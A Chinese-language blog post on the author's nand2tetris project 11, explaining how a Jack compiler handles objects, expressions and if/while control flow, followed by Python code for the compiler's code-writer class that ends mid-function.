<h1 id="Handling-Objects"><a href="#Handling-Objects" class="headerlink" title="Handling Objects"></a>Handling Objects</h1><p>处理成员变量跟数据也是同样的原因，我们实际调用对象时，也只是调用对象的首地址而已，将首地址写入到寄存器中，然后根据变量的索引求出变量与首地址的偏移，然后通过间接寻址，即可得到类的成员变量。我觉得这个思想非常有趣，可以利用这个思想实现<code>C</code>语言的面向对象的编程。处理类时，在类的构造函数运行时，则需要为该类在<code>heap</code>上单独开辟空间存放类的成员变量。</p>
<h3 id="Commands-Translation"><a href="#Commands-Translation" class="headerlink" title="Commands Translation"></a>Commands Translation</h3><p>当然在本次的函数调用过程中并没有考虑到符号优先级的问题，只是简单的用<code>DFS</code>来处理表达式。比如如下处理：<br><img src="https://i.loli.net/2021/01/11/PTqZEmKepJBuStg.png" alt="1"><br>我们采用如下简单的<code>dfs</code>算法来处理表达式：<br><img src="https://i.loli.net/2021/01/11/HoJ1QDOXtbarKmp.png" alt="1"><br>如果理解上述核心的算法，处理就非常简单。这部分没啥好谈的。</p>
<h3 id="Translating-Flow-Control"><a href="#Translating-Flow-Control" class="headerlink" title="Translating Flow Control"></a>Translating Flow Control</h3><p><code>jack</code>语言目前只支持<code>if</code>和<code>while</code>的过程操作，处理也非常简单，我们只需要用<code>if-goto</code>和<code>goto</code>来处理所有的过程即可。</p>
<ul>
<li>对于<code>if</code>的处理:<br><img src="https://i.loli.net/2021/01/11/3aKj1huD4ilMNdq.png"></li>
<li>对于<code>while</code>的处理:<br><img src="https://i.loli.net/2021/01/11/Pr7sQnui2EVAf6S.png"></li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>主要的处理如上所示，其余还有部分比较麻烦的细节处理：</p>
<ul>
<li>对于<code>class</code>的成员方法的调用： 在实际调用过程中则需要将<code>class</code>的首地址也传入进去，则此时函数的形参应比实际要多一个，第一个参数应将类的首地址传入进去。</li>
<li>对于函数调用：在函数调用时，应将函数的参数按照顺序依次压入到栈中，当然对于绝大部分编译器来说，则此时函数参数都是倒序依次压入栈中的，每次求出参数的偏移则直接非常的简单偏移即可。</li>
<li>对于所有的函数类型都需要返回一个值，<code>void</code>类型也需要返回一个任意值即可。</li>
<li>对于乘法和出发运算，则需要调用系统自带的函数<code>mutily</code>和<code>div</code>，对于字符串常量则需要调用系统函数<code>string.new</code>，同时将字符一个一个的压入到类中，同时返回字符串类<code>string</code>的首地址，因此对于字符串常量实际是存放在<code>heap</code>中的。</li>
</ul>
<h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>还是非常有难度的<code>project</code>，本周的<code>project</code>花了差不多两个星期才完成，基本上都是利用中午休息和晚上的时间完成了这个<code>project</code>，还是非常的有意思。代码也同步放在<code>github</code>上，虽然写的非常稀烂，掩面哭一下。<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/11">poj11</a>.</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> JackTokenizer <span class="keyword">import</span> JackTokenizer,TOKEN_TYPE,KEYWORD_TYPE,tokentype,tokendict</span><br><span class="line"><span class="keyword">from</span> SymbolTable <span class="keyword">import</span> SymbolTable</span><br><span class="line"><span class="keyword">from</span> VmWriter <span class="keyword">import</span> VmWriter,SEG_TYPE,OP_TYPE,opdict</span><br><span class="line"><span class="keyword">from</span> CompileEngine <span class="keyword">import</span> CompileEngine</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CompileCodeWriter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,infile</span>):</span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.parser = JackTokenizer(infile)</span><br><span class="line">        self.engile = CompileEngine(infile)</span><br><span class="line">        self.out = VmWriter(infile)</span><br><span class="line">        <span class="comment"># class global symbol table</span></span><br><span class="line">        self.classTable = SymbolTable()</span><br><span class="line">        <span class="comment"># sub routine symbol table</span></span><br><span class="line">        self.subTable = SymbolTable()</span><br><span class="line">        <span class="comment"># vm writer</span></span><br><span class="line">        self.vmout = VmWriter(infile)</span><br><span class="line">        <span class="comment"># class name</span></span><br><span class="line">        self.classname = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.subname = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.subkind = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.subtype = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.iflabelcnt = <span class="number">0</span></span><br><span class="line">        self.whilelabelcnt = <span class="number">0</span></span><br><span class="line">        self.writeClassCode()</span><br><span class="line">        self.out.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ifLabel</span>(<span class="params">self</span>):</span><br><span class="line">        res = []</span><br><span class="line">        res.append(<span class="string">&quot;IF_END&quot;</span> + <span class="built_in">str</span>(self.iflabelcnt))</span><br><span class="line">        res.append(<span class="string">&quot;IF_&quot;</span> + <span class="built_in">str</span>(self.iflabelcnt))</span><br><span class="line">        self.iflabelcnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">whileLabel</span>(<span class="params">self</span>):</span><br><span class="line">        res = []</span><br><span class="line">        res.append(<span class="string">&quot;WHILE_EXP&quot;</span> + <span class="built_in">str</span>(self.whilelabelcnt))</span><br><span class="line">        res.append(<span class="string">&quot;WHILE_END&quot;</span> + <span class="built_in">str</span>(self.whilelabelcnt))</span><br><span class="line">        self.whilelabelcnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">functionLabel</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.classname + <span class="string">&quot;.&quot;</span> + self.subname</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeClassCode</span>(<span class="params">self</span>):</span><br><span class="line">        self.classTable.startSubroutine()</span><br><span class="line">        <span class="comment"># parse class</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse class name</span></span><br><span class="line">        self.classname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment">#parse symbol &#x27;&#123;&#x27; </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment">#parse class val des</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">              (self.parser.keyWord() == <span class="string">&quot;static&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;field&quot;</span>):</span><br><span class="line">            self.writeClassVarDecCode()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#parse class method</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">            (self.parser.keyWord() == <span class="string">&quot;method&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;constructor&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;function&quot;</span>):</span><br><span class="line">            self.subkind = self.parser.keyWord()</span><br><span class="line">            self.writeSubroutineCode()</span><br><span class="line">        <span class="comment">#parse symbol &#x27;&#123;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>          </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeClassVarDecCode</span>(<span class="params">self</span>):</span><br><span class="line">        varname = <span class="string">&quot;&quot;</span></span><br><span class="line">        vartype = <span class="string">&quot;&quot;</span></span><br><span class="line">        varkind = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        varkind = self.parser.keyWord()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse val type</span></span><br><span class="line">        vartype = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse val name</span></span><br><span class="line">        varname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment">#add one var define to the symbol table</span></span><br><span class="line">        self.classTable.define(varname,vartype,varkind)</span><br><span class="line">        <span class="comment"># parse the left val name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">&quot;;&quot;</span>):</span><br><span class="line">            <span class="comment"># parse symbol &#x27;,&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse val name</span></span><br><span class="line">            varname = self.parser.currToken()</span><br><span class="line">            self.classTable.define(varname,vartype,varkind)</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="comment"># parse the end symbol &#x27;;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeSubroutineCode</span>(<span class="params">self</span>):</span><br><span class="line">        fieldcnt = <span class="number">0</span></span><br><span class="line">        self.subTable.startSubroutine()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        self.subkind = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">if</span> self.subkind == <span class="string">&quot;method&quot;</span>:</span><br><span class="line">            self.subTable.define(<span class="string">&quot;this&quot;</span>,self.classname,<span class="string">&quot;argument&quot;</span>)</span><br><span class="line">        <span class="comment"># parse type</span></span><br><span class="line">        self.subtype = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse subroutineName</span></span><br><span class="line">        self.subname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse param list</span></span><br><span class="line">        self.writeParameterListCode()</span><br><span class="line">        <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse body</span></span><br><span class="line">        self.writeSubroutineBodyCode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeSubroutineBodyCode</span>(<span class="params">self</span>):</span><br><span class="line">        nlocals = <span class="number">0</span></span><br><span class="line">        <span class="comment"># parse &#x27;&#123;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse var </span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">            nlocals += self.writeVarDecCode()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># function define</span></span><br><span class="line">        funcname = self.classname + <span class="string">&quot;.&quot;</span> + self.subname</span><br><span class="line">        self.out.writeFunction(funcname,nlocals)</span><br><span class="line">        <span class="keyword">if</span> self.subkind == <span class="string">&quot;constructor&quot;</span>:</span><br><span class="line">            fieldcnt = self.classTable.varCount(<span class="string">&quot;field&quot;</span>)</span><br><span class="line">            self.out.writePush(<span class="string">&quot;constant&quot;</span>,fieldcnt)</span><br><span class="line">            self.out.writeCall(<span class="string">&quot;Memory.alloc&quot;</span>,<span class="number">1</span>)</span><br><span class="line">            self.out.writePop(<span class="string">&quot;pointer&quot;</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.subkind == <span class="string">&quot;method&quot;</span>:</span><br><span class="line">            self.out.writePush(<span class="string">&quot;argument&quot;</span>,<span class="number">0</span>)</span><br><span class="line">            self.out.writePop(<span class="string">&quot;pointer&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.writeStatementsCode()</span><br><span class="line">        <span class="comment"># parse &#x27;&#125;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeParameterListCode</span>(<span class="params">self</span>):</span><br><span class="line">        varname = <span class="string">&quot;&quot;</span></span><br><span class="line">        varkind = <span class="string">&quot;argument&quot;</span></span><br><span class="line">        vartype = <span class="string">&quot;&quot;</span></span><br><span class="line">        paramcnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse rest param</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span>\</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;)&quot;</span>):</span><br><span class="line">            <span class="comment"># parse element type</span></span><br><span class="line">            vartype = self.parser.currToken()</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse element varName</span></span><br><span class="line">            varname = self.parser.currToken()</span><br><span class="line">            paramcnt += <span class="number">1</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># add argument variable into the symbol table</span></span><br><span class="line">            self.subTable.define(varname,vartype,varkind)</span><br><span class="line">            <span class="comment"># parse &#x27;,&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                <span class="keyword">if</span> self.parser.symbol() == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">elif</span> self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> paramcnt</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeVarDecCode</span>(<span class="params">self</span>):</span><br><span class="line">        nlocals = <span class="number">1</span></span><br><span class="line">        varname = <span class="string">&quot;&quot;</span></span><br><span class="line">        varkind = <span class="string">&quot;var&quot;</span></span><br><span class="line">        vartype = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        varkind = self.parser.keyWord()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse var type</span></span><br><span class="line">        vartype = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse var name</span></span><br><span class="line">        varname = self.parser.currToken()</span><br><span class="line">        self.parser.advance()</span><br><span class="line">        self.subTable.define(varname,vartype,varkind)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the rest var name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">&quot;;&quot;</span>):</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse var name</span></span><br><span class="line">            nlocals += <span class="number">1</span></span><br><span class="line">            varname = self.parser.currToken()</span><br><span class="line">            self.subTable.define(varname,vartype,varkind)</span><br><span class="line">            self.parser.advance()</span><br><span class="line">  </span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">return</span> nlocals </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeStatementsCode</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">             (self.parser.keyWord() == <span class="string">&quot;do&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;if&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;while&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;let&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">&quot;return&quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">&quot;do&quot;</span>:</span><br><span class="line">                self.writeDoCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;if&quot;</span>:</span><br><span class="line">                self.writeIfCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;while&quot;</span>:</span><br><span class="line">                self.writeWhileCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;let&quot;</span>:</span><br><span class="line">                self.writeLetCode()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">&quot;return&quot;</span>:</span><br><span class="line">                self.writeReturnCode()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;valid statement define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeDoCode</span>(<span class="params">self</span>):</span><br><span class="line">        funcname = []</span><br><span class="line">        argsCnt = <span class="number">0</span></span><br><span class="line">        varname = <span class="string">&quot;&quot;</span></span><br><span class="line">        vartype = <span class="string">&quot;&quot;</span></span><br><span class="line">        varkind = <span class="string">&quot;&quot;</span></span><br><span class="line">        varidx  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse do</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse &#x27;call name&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;(&quot;</span>):</span><br><span class="line">            <span class="comment"># write code</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() != TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                funcname.append(self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># sub call</span></span><br><span class="line">        callname = <span class="string">&quot;&quot;</span></span><br><span class="line">        varname = funcname[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(funcname) == <span class="number">1</span>:</span><br><span class="line">            self.out.writePush(<span class="string">&quot;pointer&quot;</span>,<span class="number">0</span>)</span><br><span class="line">            callname = self.classname + <span class="string">&quot;.&quot;</span> + funcname[<span class="number">0</span>]</span><br><span class="line">            argsCnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(funcname) == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">if</span> self.subTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">                vartype = self.subTable.typeOf(varname)</span><br><span class="line">                varkind = self.subTable.kindOf(varname)</span><br><span class="line">                varidx =  self.subTable.indexOf(varname)</span><br><span class="line">                callname = vartype + <span class="string">&quot;.&quot;</span> + funcname[<span class="number">1</span>]</span><br><span class="line">                argsCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span>  self.classTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">                vartype = self.classTable.typeOf(varname)</span><br><span class="line">                varkind = self.classTable.kindOf(varname)</span><br><span class="line">                varidx =  self.classTable.indexOf(varname)</span><br><span class="line">                callname = vartype + <span class="string">&quot;.&quot;</span> + funcname[<span class="number">1</span>]</span><br><span class="line">                argsCnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">                <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                    self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                callname = funcname[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span> + funcname[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># parse expression list       </span></span><br><span class="line">        argsCnt += self.writeExpressionListCode()</span><br><span class="line">        <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse  &#x27;;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># write call name</span></span><br><span class="line">        self.out.writeCall(callname,argsCnt)</span><br><span class="line">        self.out.writePop(<span class="string">&quot;temp&quot;</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeLetCode</span>(<span class="params">self</span>):</span><br><span class="line">        varname = <span class="string">&quot;&quot;</span></span><br><span class="line">        vartype = <span class="string">&quot;&quot;</span></span><br><span class="line">        varkind = <span class="string">&quot;&quot;</span></span><br><span class="line">        varidx  = <span class="string">&quot;&quot;</span></span><br><span class="line">        isArray = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># parse let </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">   </span><br><span class="line">        <span class="comment"># parse varname</span></span><br><span class="line">        varname = self.parser.currToken()</span><br><span class="line">        <span class="comment"># search the key</span></span><br><span class="line">        <span class="keyword">if</span> self.subTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">            vartype = self.subTable.typeOf(varname)</span><br><span class="line">            varkind = self.subTable.kindOf(varname)</span><br><span class="line">            varidx =  self.subTable.indexOf(varname)</span><br><span class="line">        <span class="keyword">elif</span>  self.classTable.indexOf(varname) &gt;= <span class="number">0</span>:</span><br><span class="line">            vartype = self.classTable.typeOf(varname)</span><br><span class="line">            varkind = self.classTable.kindOf(varname)</span><br><span class="line">            varidx =  self.classTable.indexOf(varname)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;invalid var statement!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># skip varname</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">      </span><br><span class="line">        <span class="comment"># parse `[expression]`</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># we push the head arrdress of the array</span></span><br><span class="line">            isArray = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># parse &#x27;[&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.writeExpressionCode()</span><br><span class="line">            <span class="comment"># we parse the array</span></span><br><span class="line">            <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                self.out.writePush(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                self.out.writePush(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                self.out.writePush(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                self.out.writePush(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">            self.out.writeArithmetic(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">            <span class="comment"># parse &#x27;]&#x27;</span></span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  &#x27;=&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        <span class="comment"># pop value from the stack</span></span><br><span class="line">        <span class="keyword">if</span> isArray:</span><br><span class="line">            self.out.writePop(<span class="string">&quot;temp&quot;</span>,<span class="number">0</span>)</span><br><span class="line">            self.out.writePop(<span class="string">&quot;pointer&quot;</span>,<span class="number">1</span>)</span><br><span class="line">            self.out.writePush(<span class="string">&quot;temp&quot;</span>,<span class="number">0</span>)</span><br><span class="line">            self.out.writePop(<span class="string">&quot;that&quot;</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> varkind == <span class="string">&quot;field&quot;</span>:</span><br><span class="line">                self.out.writePop(<span class="string">&quot;this&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">                self.out.writePop(<span class="string">&quot;local&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">&quot;static&quot;</span>:</span><br><span class="line">                self.out.writePop(<span class="string">&quot;static&quot;</span>,varidx)</span><br><span class="line">            <span class="keyword">elif</span> varkind == <span class="string">&quot;argument&quot;</span>:</span><br><span class="line">                self.out.writePop(<span class="string">&quot;argument&quot;</span>,varidx)</span><br><span class="line">        <span class="comment"># parse  &#x27;;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeWhileCode</span>(<span class="params">self</span>):</span><br><span class="line">        label = self.whileLabel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.out.writeLabel(label[<span class="number">0</span>])</span><br><span class="line">        self.writeExpressionCode()</span><br><span class="line">        self.out.writeSigArithmetic(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">        self.out.writeIf(label[<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># parse  &#x27;)&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse  &#x27;&#123;&#x27;</span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.writeStatementsCode()</span><br><span class="line">        self.out.writeGoto(label[<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># parse  &#x27;&#125;&#x27;</span></span><br><span class="line">        self.out.writeLabel(label[<span class="number">1</span>])</span><br><span class="line">        self.parser.advance()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writeReturnCode</span>(<span class="params">self</span>):        </span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        self.parser.advance()</span><br><span class="line">        <span class="comment"># parse expression  list</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">            self.writeExpressionCode()</span><br><span class="line">        <span class="comment"># parse 